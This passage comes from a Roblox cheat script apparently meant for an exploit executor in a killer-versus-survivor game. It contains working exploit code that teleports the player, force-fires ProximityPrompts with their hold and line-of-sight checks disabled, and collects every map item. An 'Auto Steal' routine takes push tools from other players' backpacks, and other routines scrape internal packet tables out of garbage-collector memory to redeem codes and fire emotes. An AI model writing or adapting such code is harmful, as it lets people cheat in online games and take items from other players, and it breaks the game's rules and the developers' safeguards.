        ["dish"] = "Dishes",     ["clean"]    = "Dishes",   ["wash"]  = "Dishes",
        ["netflix"] = "Netflix", ["watch"]    = "Netflix",  ["tv"]    = "Netflix",
        ["study"] = "Study",     ["homework"] = "Study",
        ["sleep"] = "SleepMasterBedroom", ["master"] = "SleepMasterBedroom", ["bedroom"] = "SleepMasterBedroom",
    }

    -- ── Map & Folder Finders ──────────────────────────────────────────────
    local function _gGM()
        for _, child in ipairs(workspace:GetChildren()) do
            if child.Name == "Map" and child:IsA("Model") then return child end
        end
        local mapFolder = workspace:FindFirstChild("Map")
        if mapFolder then
            for _, child in ipairs(mapFolder:GetChildren()) do
                if child.Name == "Map" and child:IsA("Model") then return child end
            end
            for _, child in ipairs(mapFolder:GetChildren()) do
                if child:IsA("Model") and child.Name ~= "Spawn" and child.Name ~= "ZoneReference" and child.Name ~= "Lobby" then
                    return child
                end
            end
        end
        return nil
    end

    -- Finds the Quests folder in the current map
    local function _gQF()
        local gmap = _gGM()
        if gmap then
            local q = gmap:FindFirstChild("Quests", true)
            if q then return q end
        end
        local q0 = workspace:FindFirstChild("Quests")
        if q0 then return q0 end
        local map1 = workspace:FindFirstChild("Map")
        if map1 then
            local q1 = map1:FindFirstChild("Quests", true)
            if q1 then return q1 end
        end
        for _, child in ipairs(workspace:GetChildren()) do
            local q2 = child:FindFirstChild("Quests", true)
            if q2 then return q2 end
        end
        return nil
    end

    -- Finds the Items folder in the current map
    local function getItemsFolder()
        local map1 = workspace:FindFirstChild("Map")
        if not map1 then return nil end
        local map2 = map1:FindFirstChild("Map")
        if map2 then
            local items = map2:FindFirstChild("Items")
            if items then return items end
            return map2
        end
        local direct2 = map1:FindFirstChild("Items")
        if direct2 then return direct2 end
        --local direct = workspace:FindFirstChild("Items")
        --if direct then return direct end
        return nil
    end

    -- Returns the quest part furthest from all killers (for SafeQuest)
    local function _gFQ()
        local killerPositions = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Team and (p.Team.Name:lower() == "killers" or p.Team.Name:lower() == "killer") and p.Character then
                local hrp = p.Character:FindFirstChild("HumanoidRootPart")
                if hrp then table.insert(killerPositions, hrp.Position) end
            end
        end
        local folder = _gQF()
        if not folder then return nil end
        if #killerPositions == 0 then return nil, 0 end
        local bestPart, bestDist = nil, -1
        for _, child in ipairs(folder:GetChildren()) do
            local part = child:IsA("BasePart") and child
                or (child:IsA("Model") and (child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")))
            if not part then continue end
            local minKillerDist = math.huge
            for _, kPos in ipairs(killerPositions) do
                local d = (part.Position - kPos).Magnitude
                if d < minKillerDist then minKillerDist = d end
            end
            if minKillerDist > bestDist then
                bestDist = minKillerDist
                bestPart = part
            end
        end
        return bestPart, bestDist
    end

    -- ── Safe Quest Teleport ───────────────────────────────────────────────
    local safeQuestConn = nil
    _xSQ = function()
        if safeQuestConn then safeQuestConn:Disconnect(); safeQuestConn = nil end
    end
    _sSQ = function()
        _xSQ()
        local RECHECK_RATE = 2.5
        local timer = 0
        safeQuestConn = RunService.Heartbeat:Connect(function(dt)
            if not cfg.SafeQuestEnabled then _xSQ(); return end
            timer = timer + dt
            if timer < RECHECK_RATE then return end
            timer = 0
            local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not myHRP then return end
            local bestPart = _gFQ()
            if not bestPart then return end
            if (myHRP.Position - bestPart.Position).Magnitude > 5 then
                local dest = CFrame.new(bestPart.Position + Vector3.new(0, 4, 0))
                pcall(function() myHRP.CFrame = dest end)
            end
        end)
    end

    -- ── Quest Execution ───────────────────────────────────────────────────
    local function getAssignedQuestName()
        local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        if not pg then return nil end
        local questUI = pg:FindFirstChild("QuestUI")
        if questUI then
            local collage = questUI:FindFirstChild("Collage")
            if collage then
                local lbl = collage:FindFirstChild("Label")
                if lbl and lbl:IsA("TextLabel") and lbl.Text ~= "" then
                    local txt = lbl.Text
                    local name = txt:match("^(.-)%s*%.") or txt:match("^(.-)%s*%(")
                    if name then name = name:gsub("^%s+",""):gsub("%s+$","") end
                    if name and #name > 1 then return name:lower() end
                end
            end
        end
        for _, gui in ipairs(pg:GetDescendants()) do
            if (gui:IsA("TextLabel") or gui:IsA("TextButton")) and gui.Visible then
                local txt = gui.Text or ""
                if txt:match("%(1/%d+%)") or txt:match("%$%d+") then
                    local name = txt:match("^(.-)%s*%.") or txt:match("^(.-)%s*%(")
                    if name then name = name:gsub("^%s+",""):gsub("%s+$","") end
                    if name and #name > 1 then return name:lower() end
                end
            end
        end
        return nil
    end

    -- Fuzzy-matches a display quest name to a folder child
    local function matchQuestFolder(folder, displayName)
        if not displayName then return nil end
        local dn = displayName:lower()
        for _, q in ipairs(folder:GetChildren()) do
            if q.Name:lower():find(dn, 1, true) or dn:find(q.Name:lower(), 1, true) then return q end
        end
        for word, fn in pairs(QUEST_NAME_MAP) do
            if dn:find(word, 1, true) then
                local q = folder:FindFirstChild(fn)
                if q then return q end
            end
        end
        for _, q in ipairs(folder:GetChildren()) do
            local qn = q.Name:lower()
            for word in dn:gmatch("%a+") do
                if #word > 3 and qn:find(word, 1, true) then return q end
            end
        end
        return nil
    end

    -- Teleports to and fires all quest ProximityPrompts for the assigned quest
    doQuestNow = function()
        task.spawn(function()
            local attempts = 0
            local folder = _gQF()
            while not folder and attempts < 20 do
                task.wait(0.5); folder = _gQF(); attempts = attempts + 1
            end
            if not folder then return end
            local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not myHRP then return end
            local returnCF = myHRP.CFrame
            local assignedName = getAssignedQuestName()
            local targets = {}
            if assignedName then
                local matched = matchQuestFolder(folder, assignedName)
                if matched then table.insert(targets, matched) end
            end
            if #targets == 0 then
                for _, q in ipairs(folder:GetChildren()) do table.insert(targets, q) end
            end
            for _, q in ipairs(targets) do
                myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not myHRP or not myHRP.Parent then break end
                local part = q:IsA("BasePart") and q
                    or (q:IsA("Model") and (q.PrimaryPart or q:FindFirstChildWhichIsA("BasePart")))
                local pp = q:FindFirstChildWhichIsA("ProximityPrompt", true)
                        or (q:IsA("ProximityPrompt") and q)
                if not part and not pp then continue end
                local targetPos = (part and part.Position)
                               or (pp and pp.Parent and pp.Parent:IsA("BasePart") and pp.Parent.Position)
                if not targetPos then continue end
                pcall(function() myHRP.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0)) end)
                task.wait(0.15)
                if pp then
                    local origHoldDur  = pp.HoldDuration
                    local origMaxDist  = pp.MaxActivationDistance
                    local origEnabled  = pp.Enabled
                    local origRequiresLineOfSight = pp.RequiresLineOfSight
                    pcall(function() pp.HoldDuration = 0 end)
                    pcall(function() pp.MaxActivationDistance = 99 end)
                    pcall(function() pp.RequiresLineOfSight = false end)
                    -- wait a frame so CoreScript processes HoldDuration=0
                    -- before we fire, preventing 'attempt to index userdata with Play'
                    task.wait()
                    if fireproximityprompt then
                        pcall(function() fireproximityprompt(pp) end)
                    else
                        pcall(function() game:GetService("ProximityPromptService"):FirePromptTriggered(pp, LocalPlayer) end)
                    end
                    task.defer(function()
                        pcall(function() pp.HoldDuration           = origHoldDur  end)
                        pcall(function() pp.MaxActivationDistance  = origMaxDist  end)
                        pcall(function() pp.Enabled                = origEnabled  end)
                        pcall(function() pp.RequiresLineOfSight    = origRequiresLineOfSight end)
                    end)
                end
                task.wait(0.25)
            end
            pcall(function() myHRP.CFrame = returnCF end)
        end)
    end

    UILib.registerKeybind("DoQuest", function()
        task.spawn(doQuestNow)
    end)

    -- Auto-refresh quest tab when Quests folder appears in workspace
    workspace.DescendantAdded:Connect(function(desc)
        if desc.Name == "Quests" and activeTab == "Quests" then
            task.wait(0.5)
            buildQuestButtons()
        end
    end)

    -- ════════════════════════════════════════════════════════════
    -- END OF QUEST TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════


    -- ════════════════════════════════════════════════════════════
    -- MISC TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════

    -- ── Tool Lookup Helpers ───────────────────────────────────────────────
    local GUNS         = { ["AK-47"]=true, ["DSA"]=true, ["Desert Eagle"]=true, ["Glock 17"]=true, ["M4"]=true, ["SPAS-12"]=true, ["UZI"]=true, ["Bat"]=true }
    local PUSH_ITEMS   = { ["Push"]=true, ["Super Push"]=true }
    local PUSH_PRIORITY = { "Super Push", "Push" }

    local function getPlayerGun(plr)
        local function scan(parent)
            if not parent then return nil end
            for _, item in ipairs(parent:GetChildren()) do
                if item:IsA("Tool") and GUNS[item.Name] then return item.Name end
            end
        end
        return scan(plr.Character) or scan(plr:FindFirstChildOfClass("Backpack"))
    end

    -- Returns (name, instance) of the push tool carried by plr
    local function getPlayerPushItem(plr)
        local function scan(parent)
            if not parent then return nil, nil end
            for _, item in ipairs(parent:GetChildren()) do
                if item:IsA("Tool") and PUSH_ITEMS[item.Name] then return item.Name, item end
            end
            return nil, nil
        end
        local name, inst = scan(plr.Character)
        if inst then return name, inst end
        return scan(plr:FindFirstChildOfClass("Backpack"))
    end

    -- Returns highest-priority push tool found in character/backpack
    local function getPushToolByPriority(character, backpack)
        for _, pname in ipairs(PUSH_PRIORITY) do
            if character then
                for _, item in ipairs(character:GetChildren()) do
                    if item:IsA("Tool") and item.Name == pname then return item, pname end
                end
            end
            if backpack then
                for _, item in ipairs(backpack:GetChildren()) do
                    if item:IsA("Tool") and item.Name == pname then return item, pname end
                end
            end
        end
        return nil, nil
    end

    -- Returns 1=SuperPush 2=Push 999=none for local player
    local function myPushRank()
        local ch = LocalPlayer.Character
        local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
        for i, pname in ipairs(PUSH_PRIORITY) do
            if ch then for _, v in ipairs(ch:GetChildren()) do if v:IsA("Tool") and v.Name == pname then return i end end end
            if bp then for _, v in ipairs(bp:GetChildren()) do if v:IsA("Tool") and v.Name == pname then return i end end end
        end
        return 999
    end

    -- Returns true if local player's humanoid is dead or missing
    local function wasKilled()
        local ch  = LocalPlayer.Character
        local hum = ch and ch:FindFirstChildOfClass("Humanoid")
        return not hum or hum.Health <= 0
    end

    -- ── Auto Collect All Items ────────────────────────────────────────────
    _rIC = function(statusLabel)
        if itemCollectRunning then return end
        itemCollectRunning = true
        local myHRP = getHRP()
        if not myHRP then
            if statusLabel then statusLabel.Text = "No character." end
            itemCollectRunning = false
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title="Item Collect", Text="No character found.", Duration=3}) end)
            return
        end
        local folder = getItemsFolder()
        if not folder then
            if statusLabel then statusLabel.Text = "Items folder not found." end
            itemCollectRunning = false
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title="Item Collect", Text="Items folder not found. Load into a map first.", Duration=4}) end)
            return
        end
        local returnCF = myHRP.CFrame
        local items    = folder:GetChildren()
        local total    = #items
        local done     = 0
        local wsItemsFolder = workspace:FindFirstChild("Items")  -- lobby folder, not map
        if statusLabel then statusLabel.Text = "0 / " .. total end
        for _, item in ipairs(items) do
            if not itemCollectRunning then break end
            if wasKilled() then
                itemCollectRunning = false
                if statusLabel then statusLabel.Text = "Died at " .. done .. "/" .. total .. "  -  kill brick?" end
                break
            end
            -- Skip if item moved to lobby workspace.Items or left its folder (already picked up)
            if wsItemsFolder and item.Parent == wsItemsFolder then continue end
            if item.Parent ~= folder then continue end
            -- Bob's ESP sense check: resolve the visual part and skip if invisible (already held/gone)
            local part = (item:IsA("BasePart") or item:IsA("MeshPart")) and item
                or (item:IsA("Model") and (item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart")))
            if not part then continue end
            if part.Transparency >= 1 then continue end  -- item is invisible = already picked up/held
            local pp = item:IsA("ProximityPrompt") and item
                or item:FindFirstChildOfClass("ProximityPrompt")
                or item:FindFirstChildWhichIsA("ProximityPrompt", true)
            if not pp then continue end
            pcall(function() pp.HoldDuration = 0 end)
            pcall(function() myHRP.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0)) end)
            task.wait(0.15)
            local fired = false
            if fireproximityprompt then
                fired = pcall(function() fireproximityprompt(pp) end)
            end
            if not fired then
                fired = pcall(function() game:GetService("ProximityPromptService"):FirePromptTriggered(pp, LocalPlayer) end)
            end
            if not fired then
                pcall(function() pp.Triggered:Fire(LocalPlayer) end)
            end
            if not fired and part then
                pcall(function() myHRP.CFrame = CFrame.new(part.Position) end)
                task.wait(0.3)
            end
            done = done + 1
            if statusLabel then statusLabel.Text = done .. " / " .. total end
            task.wait(0.12)
        end
        pcall(function() myHRP.CFrame = returnCF end)
        itemCollectRunning = false
        if statusLabel then statusLabel.Text = "Done! " .. done .. "/" .. total .. " collected." end
    end

    -- ── Auto Steal Push Tool ──────────────────────────────────────────────
    _xAS = function()
        if _AUTO.stealConn then _AUTO.stealConn:Disconnect(); _AUTO.stealConn = nil end
    end
    _sAS = function()
        _xAS()
        local stealTick = 0
        _AUTO.stealConn = RunService.Heartbeat:Connect(function(dt)
            if not cfg.AutoStealEnabled then _xAS(); return end
            stealTick = stealTick + dt
            if stealTick < 1.2 then return end
            stealTick = 0
            local myRank = myPushRank()
            if myRank == 1 then return end
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr == LocalPlayer then continue end
                local tool, toolName = getPushToolByPriority(plr.Character, plr:FindFirstChildOfClass("Backpack"))
                if not tool then continue end
                local theirRank = 999
                for i, pname in ipairs(PUSH_PRIORITY) do if toolName == pname then theirRank = i; break end end
                if theirRank < myRank then
                    local myBP = LocalPlayer:FindFirstChildOfClass("Backpack")
                    if myBP then
                        local ok = pcall(function() tool.Parent = myBP end)
                        if ok then
                            myRank = theirRank
                            game:GetService("StarterGui"):SetCore("SendNotification", {Title="Auto Steal", Text="Stole "..toolName.." from "..plr.Name, Duration=3})
                            if myRank == 1 then return end
                        end
                    end
                end
            end
        end)
    end

    -- ── Auto Equip Vest ───────────────────────────────────────────────────
    stopAutoVest = function()
        if _AUTO.vestEquipConn then _AUTO.vestEquipConn:Disconnect(); _AUTO.vestEquipConn = nil end
    end
    startAutoVest = function()
        stopAutoVest()
        local function tryEquipVest(tool)
            if not tool or not tool:IsA("Tool") then return end
            local n = tool.Name:lower()
            if not (n:find("vest") or n:find("tactical") or n:find("armor")) then return end
            task.spawn(function()
                local ch  = LocalPlayer.Character
                local hum = ch and ch:FindFirstChildOfClass("Humanoid")
                if not hum then return end
                if tool.Parent ~= ch then pcall(function() hum:EquipTool(tool) end); task.wait(0.3) end
                local fired = false
                for _, desc in ipairs(tool:GetDescendants()) do
                    if desc:IsA("RemoteEvent") then pcall(function() desc:FireServer() end); fired = true end
                end
                if not fired then
                    local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")
                    local cam    = workspace.CurrentCamera
                    local clickPos = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
                    if handle then
                        local sp, onScreen = cam:WorldToScreenPoint(handle.Position)
                        if onScreen then clickPos = Vector2.new(sp.X, sp.Y) end
                    end
                    pcall(function() VirtualUser:Button1Down(clickPos, cam.CFrame) end)
                    task.wait(0.1)
                    pcall(function() VirtualUser:Button1Up(clickPos, cam.CFrame) end)
                end
                pcall(function()
                    local activated = tool:FindFirstChild("Activated")
                    if activated and activated:IsA("BindableEvent") then activated:Fire() end
                end)
            end)
        end
        local function hookBackpack(bp)
            if not bp then return end
            if _AUTO.vestEquipConn then _AUTO.vestEquipConn:Disconnect() end
            _AUTO.vestEquipConn = bp.ChildAdded:Connect(function(child)
                if cfg.AutoVestEnabled then task.wait(0.1); tryEquipVest(child) end
            end)
            for _, v in ipairs(bp:GetChildren()) do
                if cfg.AutoVestEnabled then tryEquipVest(v) end
            end
        end
        hookBackpack(LocalPlayer:FindFirstChildOfClass("Backpack"))
        LocalPlayer.CharacterAdded:Connect(function()
            if not cfg.AutoVestEnabled then return end
            task.wait(0.4)
            hookBackpack(LocalPlayer:FindFirstChildOfClass("Backpack"))
        end)
    end

    -- ── Hit Notification Panel ────────────────────────────────────────────
    do
        local _hitGui = Instance.new("ScreenGui")
        _hitGui.Name           = "_MasaHitNotif"
        _hitGui.ResetOnSpawn   = false
        _hitGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        _hitGui.DisplayOrder   = 998
        pcall(function() _hitGui.Parent = game:GetService("CoreGui") end)
        if not _hitGui.Parent then _hitGui.Parent = LocalPlayer:FindFirstChildOfClass("PlayerGui") end

        local _hitPanel = Instance.new("Frame", _hitGui)
        _hitPanel.Size                   = UDim2.fromOffset(280, 62)
        _hitPanel.Position               = UDim2.new(0.5, -140, 0, -80)
        _hitPanel.BackgroundColor3       = Color3.fromRGB(14, 16, 24)
        _hitPanel.BorderSizePixel        = 0
        _hitPanel.BackgroundTransparency = 0.08
        _hitPanel.Visible                = false
        Instance.new("UICorner", _hitPanel).CornerRadius = UDim.new(0, 12)
        local _hs = Instance.new("UIStroke", _hitPanel)
        _hs.Color = Color3.fromRGB(0, 200, 90); _hs.Thickness = 1.5; _hs.Transparency = 0.2

        local _hitAccent = Instance.new("Frame", _hitPanel)
        _hitAccent.Size             = UDim2.fromOffset(4, 46)
        _hitAccent.Position         = UDim2.fromOffset(6, 8)
        _hitAccent.BackgroundColor3 = Color3.fromRGB(0, 220, 100)
        _hitAccent.BorderSizePixel  = 0
        Instance.new("UICorner", _hitAccent).CornerRadius = UDim.new(0, 2)

        local _hitName = Instance.new("TextLabel", _hitPanel)
        _hitName.Size = UDim2.new(1, -60, 0, 20); _hitName.Position = UDim2.fromOffset(18, 7)
        _hitName.BackgroundTransparency = 1; _hitName.Font = Enum.Font.GothamBold
        _hitName.TextSize = 13; _hitName.TextColor3 = Color3.fromRGB(255, 255, 255)
        _hitName.TextXAlignment = Enum.TextXAlignment.Left; _hitName.Text = ""; _hitName.BorderSizePixel = 0

        local _hitHpBg = Instance.new("Frame", _hitPanel)
        _hitHpBg.Size = UDim2.new(1, -26, 0, 5); _hitHpBg.Position = UDim2.fromOffset(18, 30)
        _hitHpBg.BackgroundColor3 = Color3.fromRGB(35, 38, 52); _hitHpBg.BorderSizePixel = 0
        Instance.new("UICorner", _hitHpBg).CornerRadius = UDim.new(0, 3)

        local _hitHpFill = Instance.new("Frame", _hitHpBg)
        _hitHpFill.Size = UDim2.new(1, 0, 1, 0); _hitHpFill.BackgroundColor3 = Color3.fromRGB(60, 220, 60); _hitHpFill.BorderSizePixel = 0
        Instance.new("UICorner", _hitHpFill).CornerRadius = UDim.new(0, 3)

        local _hitHpTxt = Instance.new("TextLabel", _hitPanel)
        _hitHpTxt.Size = UDim2.new(1, -26, 0, 14); _hitHpTxt.Position = UDim2.fromOffset(18, 37)
        _hitHpTxt.BackgroundTransparency = 1; _hitHpTxt.Font = Enum.Font.GothamSemibold
        _hitHpTxt.TextSize = 10; _hitHpTxt.TextColor3 = Color3.fromRGB(180, 190, 210)
        _hitHpTxt.TextXAlignment = Enum.TextXAlignment.Left; _hitHpTxt.Text = ""; _hitHpTxt.BorderSizePixel = 0

        local _hitTools = Instance.new("TextLabel", _hitPanel)
        _hitTools.Size = UDim2.fromOffset(54, 44); _hitTools.Position = UDim2.new(1, -60, 0, 9)
        _hitTools.BackgroundTransparency = 1; _hitTools.Font = Enum.Font.Gotham
        _hitTools.TextSize = 9; _hitTools.TextColor3 = Color3.fromRGB(0, 200, 90)
        _hitTools.TextWrapped = true; _hitTools.TextXAlignment = Enum.TextXAlignment.Right
        _hitTools.Text = ""; _hitTools.BorderSizePixel = 0

        local _hitShowing, _hitTimer, _hitConn = false, 0, nil

        local function _slideHitPanel(show)
            if _hitConn then _hitConn:Disconnect(); _hitConn = nil end
            if show then _hitPanel.Visible = true; _hitPanel.Position = UDim2.new(0.5, -140, 0, -80) end
            local targetY = show and 12 or -80
            local elapsed = 0
            _hitConn = RunService.Heartbeat:Connect(function(dt)
                elapsed = elapsed + dt
                local cur = _hitPanel.Position.Y.Offset
                local nw  = cur + (targetY - cur) * math.min(dt * 14, 1)
                _hitPanel.Position = UDim2.new(0.5, -140, 0, nw)
                if math.abs(nw - targetY) < 0.5 or elapsed > 0.5 then
                    _hitPanel.Position = UDim2.new(0.5, -140, 0, targetY)
                    _hitConn:Disconnect(); _hitConn = nil
                    if not show then _hitPanel.Visible = false end
                end
            end)
        end

        _sHN = function(plr)
            if not plr or not plr.Character then return end
            local hum   = plr.Character:FindFirstChildOfClass("Humanoid")
            local hp    = hum and math.floor(hum.Health)    or 0
            local maxHp = hum and (hum.MaxHealth > 0 and math.floor(hum.MaxHealth) or 100) or 100
            local pct   = math.clamp(hp / maxHp, 0, 1)
            local gun   = getPlayerGun(plr) or ""
            local pushNm = select(1, getPlayerPushItem(plr)) or ""
            local toolStr = gun ~= "" and gun or (pushNm ~= "" and pushNm or "")
            local isKiller = plr.Team and (plr.Team.Name:lower() == "killers" or plr.Team.Name:lower() == "killer")
            _hitName.Text             = plr.Name
            _hitName.TextColor3       = isKiller and Color3.fromRGB(255, 110, 110) or Color3.fromRGB(255, 255, 255)
            _hitAccent.BackgroundColor3 = isKiller and Color3.fromRGB(220, 50, 50) or Color3.fromRGB(0, 220, 100)
            _hs.Color                 = isKiller and Color3.fromRGB(220, 50, 50)   or Color3.fromRGB(0, 200, 90)
            _hitHpFill.Size           = UDim2.new(pct, 0, 1, 0)
            _hitHpFill.BackgroundColor3 = Color3.fromRGB(math.floor((1-pct)*220), math.floor(pct*180+40), 40)
            _hitHpTxt.Text            = hp .. " / " .. maxHp .. " HP"
            _hitTools.Text            = toolStr
            _hitShowing = true; _hitTimer = 0
            _slideHitPanel(true)
        end

        RunService.Heartbeat:Connect(function(dt)
            if _hitShowing then
                _hitTimer = _hitTimer + dt
                if _hitTimer >= 2.5 then _hitShowing = false; _slideHitPanel(false) end
            end
        end)
    end

    -- ════════════════════════════════════════════════════════════
    -- MISC TAB FUNCTIONS (continued) — Packets, Emotes, KO Detector
    -- ════════════════════════════════════════════════════════════

    -- ── Packet Finder ────────────────────────────────────────────────────
    -- Finds the Packets module table via getgc() so we can call packet:Fire()
    local _cachedPackets = nil
    _getPackets = function()  -- assigns to forward-decl at line ~2183, NOT a new local
        if _cachedPackets then return _cachedPackets end
        local ok, gc = pcall(getgc, true)
        if not ok or type(gc) ~= "table" then return nil end
        for _, t in next, gc do
            if type(t) == "table" then
                local rc = rawget(t, "redeemCode")
                local em = rawget(t, "emote")
                if rc and em then
                    _cachedPackets = t
                    return t
                end
            end
        end
        return nil
    end

    -- ── Auto Redeem Codes ─────────────────────────────────────────────────
    local REDEEM_CODES = { "11mil", "ghost", "12kmembers", "100kfavorites", "hitman", "zombiesagain" }
    local function redeemAllCodes(statusLbl)
        local pkts = _getPackets()
        if not pkts then
            if statusLbl then statusLbl.Text = "❌ Packets not found yet — retry" end
            task.delay(3, function() if statusLbl and statusLbl.Parent then statusLbl.Text = "" end end)
            return
        end
        local sent = 0
        for _, code in ipairs(REDEEM_CODES) do
            pcall(function() pkts.redeemCode:Fire(code) end)
            sent = sent + 1
            task.wait(0.15)
        end
        if statusLbl then statusLbl.Text = "✓ Sent " .. sent .. " codes!" end
        task.delay(3, function() if statusLbl and statusLbl.Parent then statusLbl.Text = "" end end)
    end

    -- ── Emote Scanner & Firer ────────────────────────────────────────────
    local _scannedEmotes  = nil
    local _emoteIdxCache  = 1   -- persists across tab switches
    local function scanEmotes()
        if _scannedEmotes then return _scannedEmotes end
        local found, seen = {}, {}
        local EMOTE_BLACKLIST = {
            remoteevent = true, getservers = true, emotesdata = true,
            emotes = true, emoteui = true, emote = true,
            quickjoin = true, playemote = true, joinspecific = true,
            hitboxclassremote = true, windgust = true,
        }
        local function add(name)
            if type(name) ~= "string" or #name == 0 then return end
            if seen[name] then return end
            if EMOTE_BLACKLIST[name:lower()] then return end
            seen[name] = true; table.insert(found, name)
        end
        -- 1. ReplicatedStorage — look for Emotes folders
        local rs = game:GetService("ReplicatedStorage")
        for _, obj in ipairs(rs:GetDescendants()) do
            local n = obj.Name:lower()
            if n:find("emote") then
                if obj:IsA("Folder") or obj:IsA("Model") then
                    for _, child in ipairs(obj:GetChildren()) do add(child.Name) end
                else
                    add(obj.Name)
                end
            end
        end
        -- 2. Character Animate script children (dance/wave/etc)
        local ch = LocalPlayer.Character
        if ch then
            local animate = ch:FindFirstChild("Animate")
            if animate then
                for _, child in ipairs(animate:GetChildren()) do
                    local n = child.Name:lower()
                    if n:find("dance") or n:find("wave") or n:find("cheer")
                    or n:find("laugh") or n:find("point") or n:find("emote") then
                        add(child.Name)
                    end
                end
            end
        end
        -- 3. getgc — look for emote list tables
        local ok, gc = pcall(getgc, true)
        if ok and type(gc) == "table" then
            for _, t in next, gc do
                if type(t) == "table" then
                    local em = rawget(t, "emotes") or rawget(t, "Emotes") or rawget(t, "EmoteList")
                    if em and type(em) == "table" then
                        for _, v in pairs(em) do
                            if type(v) == "string" then add(v) end
                        end
                    end
                end
            end
        end
        -- Fallback: common names
        if #found == 0 then
            for _, name in ipairs({"Wave","Dance","Cheer","Laugh","Point","Dance2","Dance3","Salute"}) do
                add(name)
            end
        end
        table.sort(found)
        _scannedEmotes = found
        return found
    end

    -- Hardcoded Roblox default emote animation IDs (fallback when not found in Animate script)
    local DEFAULT_EMOTE_IDS = {
        Wave    = "rbxassetid://128777973",
        Cheer   = "rbxassetid://129423030",
        Laugh   = "rbxassetid://129423131",
        Dance   = "rbxassetid://182435998",
        Dance2  = "rbxassetid://182436292",
        Dance3  = "rbxassetid://182436330",
        Point   = "rbxassetid://128853357",
        Salute  = "rbxassetid://3360692915",
    }

    -- Fires an emote by name. Priority:
    --  1. Find animation ID in character Animate script (game-specific emotes)
    --  2. Search ReplicatedStorage descendants for an Animation with matching name
    --  3. Fall back to DEFAULT_EMOTE_IDS table (standard Roblox emotes)
    -- Plays via Animator:LoadAnimation() so it shows locally, then also tries
    -- Packets.emote:Fire() for server-side visibility to other players.
    local _activeEmoteTrack = nil
    local _emotePaused      = false   -- true while AdjustSpeed(0) is in effect
    local _emoteSpeed       = 1.0     -- last non-zero speed set by the slider
    local function fireEmote(emoteName)
        if not emoteName or emoteName == "" then return end
        local ch = LocalPlayer.Character
        if not ch then return end
        local hum = ch:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local animator = hum:FindFirstChildOfClass("Animator")
        if not animator then
            animator = Instance.new("Animator")
            animator.Parent = hum
        end

        -- Stop any currently playing emote track
        if _activeEmoteTrack then
            pcall(function() _activeEmoteTrack:Stop() end)
            _activeEmoteTrack = nil
        end

        -- 1. Scan character Animate script for matching entry
        local animId = nil
        local animate = ch:FindFirstChild("Animate")
        if animate then
            -- Direct match by name or lowercase
            local emoteFolder = animate:FindFirstChild(emoteName)
                             or animate:FindFirstChild(emoteName:lower())
            if emoteFolder then
                -- The folder contains StringValue children whose Value is the anim ID
                for _, child in ipairs(emoteFolder:GetChildren()) do
                    if child:IsA("StringValue") and child.Value ~= "" then
                        animId = child.Value; break
                    elseif child:IsA("Animation") and child.AnimationId ~= "" then
                        animId = child.AnimationId; break
                    end
                end
                -- Or the folder IS the Animation
                if not animId and emoteFolder:IsA("Animation") then
                    animId = emoteFolder.AnimationId
                end
            end
        end

        -- 2. Search ReplicatedStorage for a matching Animation instance
        if not animId then
            local rs = game:GetService("ReplicatedStorage")
            for _, obj in ipairs(rs:GetDescendants()) do
                if obj.Name:lower() == emoteName:lower() then
                    if obj:IsA("Animation") and obj.AnimationId ~= "" then
                        animId = obj.AnimationId; break
                    end
                    local sub = obj:FindFirstChildOfClass("Animation")
                    if sub and sub.AnimationId ~= "" then
                        animId = sub.AnimationId; break
                    end
                end
            end
        end

        -- 3. Fall back to default Roblox emote IDs
        if not animId then
            animId = DEFAULT_EMOTE_IDS[emoteName]
                  or DEFAULT_EMOTE_IDS[emoteName:sub(1,1):upper() .. emoteName:sub(2):lower()]
        end

        -- Play the animation locally
        if animId then
            local anim = Instance.new("Animation")
            anim.AnimationId = animId
            local ok, track = pcall(function() return animator:LoadAnimation(anim) end)
            if ok and track then
                track.Looped    = true
                track.Priority  = Enum.AnimationPriority.Action
                track:Play()
                _activeEmoteTrack = track
            end
        end

        -- Also fire via Packets so other players see the emote server-side
        local pkts = _getPackets()
        if pkts and pkts.emote then
            pcall(function() pkts.emote:Fire(emoteName) end)
        end
    end

    -- ── Knives Out Detector ──────────────────────────────────────────────
    -- Searches broadly for a gamemode string across workspace, ReplicatedStorage,
    -- LocalPlayer data, and getgc() tables. Returns the mode string or nil.
    local function getGameMode()
        -- 1. Workspace attributes directly on workspace itself
        local wsgm = workspace:GetAttribute("GameMode") or workspace:GetAttribute("Gamemode")
                  or workspace:GetAttribute("Mode") or workspace:GetAttribute("CurrentMode")
        if wsgm then return tostring(wsgm) end

        -- 2. Workspace children: any ValueBase with "mode" / "game" / "round" in name
        for _, obj in ipairs(workspace:GetChildren()) do
            local n = obj.Name:lower()
            if obj:IsA("ValueBase") then
                if n:find("gamemode") or n:find("game_mode") or n:find("rounddata")
                or n:find("gamedata") or n:find("currentmode") or n:find("mode") then
                    local v = tostring(obj.Value)
                    if v ~= "" and v ~= "0" and v ~= "false" then return v end
                end
            end
        end

        -- 3. workspace.Map attributes (all attribute keys scanned)
        local mapF = workspace:FindFirstChild("Map")
        if mapF then
            for k, v in pairs(mapF:GetAttributes()) do
                local kl = k:lower()
                if kl:find("mode") or kl:find("gamemode") or kl:find("type") then
                    return tostring(v)
                end
            end
            -- inner Map child attributes
            for _, child in ipairs(mapF:GetChildren()) do
                for k, v in pairs(child:GetAttributes()) do
                    local kl = k:lower()
                    if kl:find("mode") or kl:find("gamemode") then
